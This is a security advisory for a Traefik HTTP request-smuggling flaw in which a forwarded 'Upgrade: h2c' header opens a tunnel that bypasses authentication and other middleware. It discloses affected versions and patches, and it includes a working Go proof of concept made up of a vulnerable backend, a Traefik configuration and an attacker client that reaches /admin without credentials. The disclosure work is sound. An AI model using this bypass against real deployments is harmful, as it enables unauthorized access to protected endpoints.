# [H] Traefik: Inconsistent Interpretation of HTTP Requests ('HTTP Request/Response Smuggling') and Incorrect Authorization

## Summary
Severity: High
Advisory: GHSA-w4v4-9rw7-5326
Aliases: CVE-2026-88008
Ecosystem: Go
Published: 2026-09-10
Source: https://osv.dev/vulnerability/GHSA-w4v4-9rw7-5326
Type: osv

## Affected
- Go: `github.com/traefik/traefik/v3` — affected >=3.4.2 <3.7.13
- Go: `github.com/traefik/traefik/v2` — affected >=2.11.26 <2.11.57

## Details
## Summary

There is a high-severity request-smuggling vulnerability in Traefik's handling of the HTTP/1.1 `Upgrade` mechanism. Since Traefik moved to unencrypted HTTP/2 with prior knowledge (Go 1.24), a client-initiated `Upgrade: h2c` request header and its connection-specific `HTTP2-Settings` header were forwarded to the backend. A backend that honours the h2c upgrade and answers `101 Switching Protocols` puts Traefik into a raw byte tunnel that bypasses the router and the entire middleware chain (authentication, IPAllowList, rate limiting) on a shared backend. The fix stops forwarding the `Upgrade: h2c` token and the `HTTP2-Settings` header; `Upgrade: websocket` is unaffected. Exploitation requires a backend that upgrades h2c without validating the `Connection` listing; common off-the-shelf servers were not exploitable in testing.

Traefik v3.4.2 through v3.6 are end-of-life and are also affected; users on those versions must upgrade to v3.7.13.

## Patches

- https://github.com/traefik/traefik/releases/tag/v2.11.57
- https://github.com/traefik/traefik/releases/tag/v3.7.13

## For more information

If you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).

<details>
<summary>Original Description</summary>

# Summary

Traefik's default HTTP reverse proxy forwards arbitrary `Connection: Upgrade` / `Upgrade: <token>` requests to the backend. Upgrade tokens are not restricted to protocols explicitly supported by Traefik.

This is exploitable when a backend accepts a non-WebSocket upgrade such as `h2c` and responds with `101 Switching Protocols`. Traefik then switches the connection into a raw byte tunnel and stops applying the HTTP routing/middleware chain.

An attacker can abuse an unprotected router pointing to the backend to establish the tunnel, then send HTTP/2 requests to other paths on the same backend. Those requests bypass the Traefik router and are therefore not subject to middleware attached to the corresponding protected route.

For example:

```text
/public                         /admin
(no auth)                       (BasicAuth)
    |                               |
    +----------- same backend ------+
                    ^
                    |
              h2c tunnel
                    |
                 attacker
```

This allows middleware such as `BasicAuth`, `ForwardAuth`, `IPAllowList`, and `RateLimit` to be bypassed. Requests sent over the tunnel also bypass Traefik's normal access logging, metrics, and tracing.

The core issue is **unrestricted client-initiated protocol upgrades combined with loss of the HTTP routing/middleware layer after `101 Switching Protocols`**.

# Technical Details

The default proxy implementation is `pkg/proxy/httputil` (the fast proxy remains experimental and is disabled by default).

The relevant request path is:

* `pkg/middlewares/forwardedheaders/forwarded_header.go` (`removeConnectionHeaders`, ~lines 198-234)

  When `Connection: Upgrade` is present, the `Upgrade` header is preserved and forwarded downstream. There is no validation that the upgrade token is `websocket`.

* `pkg/proxy/httputil/proxy.go` (`isWebSocketUpgrade`, ~line 170)

  WebSocket receives special header handling through `cleanWebSocketHeaders`, but this is not an allowlist. Other upgrade protocols are still passed through.

* `pkg/server/service/smart_roundtripper.go` (`RoundTrip`, ~line 56)

  Requests containing `Connection: Upgrade` are sent to the backend over HTTP/1, allowing the backend to perform the upgrade.

* `net/http/httputil.ReverseProxy`

  When the backend returns `101 Switching Protocols`, the reverse proxy switches to tunnel mode and copies bytes between the client and backend.

The security boundary breaks at this point.

The Traefik router and middleware chain are selected only for the initial HTTP/1 request. After the backend returns `101`, Traefik no longer parses the connection as HTTP requests and does not re-run routing or middleware for subsequent HTTP/2 streams.

The resulting flow is:

```text
Attacker
   |
   | GET /public
   | Connection: Upgrade
   | Upgrade: h2c
   v
Traefik
   |
   | r-public (no auth)
   v
Backend
   |
   | 101 Switching Protocols
   v
[raw byte tunnel]
   |
   | HTTP/2 GET /admin
   v
Backend
```

The `/admin` request never reaches the `/admin` router. It is sent directly to the backend over the existing tunnel.

I found no upgrade-token allowlist or `h2c` rejection in the relevant proxy path.

## This is distinct from configured h2c support

Traefik already supports explicitly configured h2c backends. In that case, the operator opts into HTTP/2 communication through the `h2c://` service scheme / `transportH2C` configuration.

This issue is different.

The upgrade is initiated by the client through the `Upgrade` header. Traefik forwards it regardless of whether the operator configured h2c for that backend.

Therefore, a plain HTTP/1 backend can still be affected if it happens to accept `Upgrade: h2c` and return `101`. The protocol switch is initiated by the client, and Traefik does not gate it.

# PoC

Reproduced against a Traefik binary built from master at commit `9bb0e55`:

```text
go build ./cmd/traefik
Go 1.26.4
```

Default configuration was used, with no `encodedCharacters` or upgrade-related options enabled.

## 1. Backend

The backend implements a minimal HTTP/1.1 → h2c upgrade handler.

It exposes:

* `/public` — unauthenticated
* `/admin` — intended to be protected by Traefik

```go
package main

import (
    "bufio"
    "fmt"
    "net"
    "net/http"
    "strings"

    "golang.org/x/net/http2"
)

func main() {
    mux := http.NewServeMux()

    mux.HandleFunc("/public", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(w, "public ok\n")
    })

    mux.HandleFunc("/admin", func(w http.ResponseWriter, r *http.Request) {
        fmt.Fprintf(
            w,
            "ADMIN SECRET DATA (proto=%s path=%s)\n",
            r.Proto,
            r.URL.Path,
        )
    })

    h2s := &http2.Server{}

    ln, _ := net.Listen("tcp", "127.0.0.1:9900")

    for {
        c, err := ln.Accept()
        if err != nil {
            return
        }

        go func(conn net.Conn) {
            br := bufio.NewReader(conn)
            var sb strings.Builder

            for {
                line, err := br.ReadString('\n')
                if err != nil {
                    return
                }

                sb.WriteString(line)

                if line == "\r\n" {
                    break
                }
            }

            if strings.Contains(sb.String(), "Upgrade: h2c") {
                conn.Write([]byte(
                    "HTTP/1.1 101 Switching Protocols\r\n" +
                        "Connection: Upgrade\r\n" +
                        "Upgrade: h2c\r\n\r\n",
                ))

                h2s.ServeConn(conn, &http2.ServeConnOpts{
                    Handler: mux,
                })

                return
            }

            conn.Close()
        }(c)
    }
}
```

## 2. Traefik configuration

`traefik.yml`:

```yaml
entryPoints:
  web:
    address: "127.0.0.1:9080"

providers:
  file:
    filename: "dynamic.yml"
```

`dynamic.yml`:

```yaml
http:
  routers:
    r-public:
      rule: "PathPrefix(`/public`)"
      entryPoints: ["web"]
      service: svc

    r-admin:
      rule: "PathPrefix(`/admin`)"
      entryPoints: ["web"]
      service: svc
      middlewares: ["adminauth"]

  middlewares:
    adminauth:
      basicAuth:
        users:
          - "admin:$2a$10$J33WYF/FCnoWm7PPeEG7leme9d.MioVmaTgJ49MemNXJtdbEyqfs."

  services:
    svc:
      loadBalancer:
        servers:
          - url: "http://127.0.0.1:9900"
```

Both routers terminate on the same backend. Only `/admin` has authentication.

## 3. Attacker

The PoC first verifies that `/admin` is protected, then establishes an unauthenticated `h2c` tunnel through `/public` and sends `/admin` over the resulting HTTP/2 connection.

```go
package main

import (
    "fmt"
    "io"
    "net"
    "net/http"
    "strings"
    "time"

    "golang.org/x/net/http2"
)

func main() {
    front := "127.0.0.1:9080"

    resp, _ := http.Get("http://" + front + "/admin")
    b, _ := io.ReadAll(resp.Body)
    resp.Body.Close()

    fmt.Printf(
        "[1] Direct GET /admin (no creds) -> %d %q\n",
        resp.StatusCode,
        strings.TrimSpace(string(b)),
    )

    raw, _ := net.Dial("tcp", front)

    raw.Write([]byte(
        "GET /public HTTP/1.1\r\n" +
            "Host: x\r\n" +
            "Connection: Upgrade, HTTP2-Settings\r\n" +
            "Upgrade: h2c\r\n" +
            "HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA\r\n" +
            "\r\n",
    ))

    buf := make([]byte, 256)

    raw.SetReadDeadline(time.Now().Add(3 * time.Second))
    n, _ := raw.Read(buf)

    fmt.Printf(
        "[2] Upgrade: h2c to /public (no auth) -> %q\n",
        strings.SplitN(string(buf[:n]), "\r\n", 2)[0],
    )

    raw.SetReadDeadline(time.Time{})

    cc, _ := (&http2.Transport{}).NewClientConn(raw)

    req, _ := http.NewRequest("GET", "http://x/admin", nil)

    r2, _ := cc.RoundTrip(req)
    b2, _ := io.ReadAll(r2.Body)
    r2.Body.Close()

    fmt.Printf(
        "[3] HTTP/2 GET /admin over tunnel -> %d %q\n",
        r2.StatusCode,
        strings.TrimSpace(string(b2)),
    )
}
```

### Result

```text
[1] Direct GET /admin (no creds)      -> 401 "401 Unauthorized"
[2] Upgrade: h2c to /public (no auth) -> "HTTP/1.1 101 Switching Protocols"
[3] HTTP/2 GET /admin over tunnel     -> 200 "ADMIN SECRET DATA (proto=HTTP/2.0 path=/admin)"
```

This demonstrates the bypass:

* Direct `/admin` → `401`
* Unauthenticated `/public` → `101`
* `/admin` over the established h2c tunnel → `200`

The PoC therefore shows that the `/admin` middleware is enforced for normal requests but is completely bypassed once the attacker establishes the upgrade tunnel.

# Impact

The issue is exploitable when:

1. An attacker can reach a router without the relevant security middleware.
2. That router points to the same backend as a protected router.
3. The backend accepts `Upgrade: h2c` and returns `101 Switching Protocols`.
4. Traefik allows the resulting upgrade to complete.

Under these conditions, an unauthenticated attacker can bypass middleware protecting other paths on the same backend.

Potentially affected middleware includes:

* `BasicAuth`
* `ForwardAuth`
* `IPAllowList`
* `RateLimit`
* header/security middleware
* other per-request middleware attached to the protected router

The tunneled requests also bypass Traefik's normal request processing and therefore do not appear as individual requests in the normal access logs, metrics, or tracing pipeline.

The impact is therefore not limited to auth bypass. Depending on the backend, an attacker may reach internal/admin endpoints or perform operations that were intended to be protected by Traefik.

# Scope / Preconditions

The backend must support the HTTP/1.1 → h2c upgrade mechanism and return `101 Switching Protocols`.

This is not true for every HTTP/2-capable backend.

For example, recent `golang.org/x/net/http2/h2c` implementations no longer support the HTTP/1.1 upgrade mechanism, so a current Go h2c server using that implementation is not necessarily affected.

Older implementations, non-Go servers, custom h2c handlers, and some gRPC-related stacks may still accept the upgrade.

Therefore, this is **not** a generic "Traefik + HTTP/2 backend = vulnerable" issue. The backend's ability to accept the client-initiated upgrade is a required prerequisite.

The Traefik-side issue itself does not depend on the operator explicitly configuring h2c: the upgrade is client-initiated, forwarded by Traefik, and followed by a transition out of the HTTP routing/middleware path.

# Suggested Fix

The proxy should only forward upgrade protocols explicitly supported and negotiated by Traefik, e.g. WebSocket.

At minimum, unsupported upgrade tokens should be rejected or stripped before forwarding upstream:

```text
Upgrade: h2c
Upgrade: <arbitrary-token>
```

More generally, Traefik should not treat an arbitrary `101 Switching Protocols` response as sufficient to transition into a tunnel unless the requested upgrade protocol is explicitly supported by Traefik.

The relevant security property is:

> **A client must not be able to select an arbitrary protocol upgrade and thereby escape Traefik's HTTP routing/middleware layer.**

# TL;DR

Traefik forwards arbitrary client-supplied `Upgrade` tokens.

If a backend accepts `Upgrade: h2c` and returns `101`, Traefik switches the connection into a raw tunnel. HTTP/2 requests sent through that tunnel are no longer processed by Traefik's routers or middleware.

An attacker can therefore use an unprotected router to establish the tunnel and reach protected paths on the same backend:

```text
/public (no auth)
      |
      | Upgrade: h2c
      v
   Traefik
      |
      | 101
      v
  raw tunnel
      |
      | HTTP/2 GET /admin
      v
   Backend
      |
      v
/admin
(middleware bypassed)
```

In the PoC, a direct unauthenticated request to `/admin` returns `401`, while the same endpoint accessed over the h2c tunnel returns `200`.

The root cause is **unrestricted client-initiated protocol upgrades combined with the loss of Traefik's HTTP routing/middleware enforcement after `101 Switching Protocols`.**

</details>
---

## References
- https://github.com/traefik/traefik/security/advisories/GHSA-w4v4-9rw7-5326
- https://nvd.nist.gov/vuln/detail/CVE-2026-88008
- https://github.com/traefik/traefik/pull/13797
- https://github.com/traefik/traefik/commit/a277e94664ffc1ce9543df552d3bbf48d4d3b8b3
- https://github.com/traefik/traefik
- https://github.com/traefik/traefik/releases/tag/v2.11.57
- https://github.com/traefik/traefik/releases/tag/v3.7.13
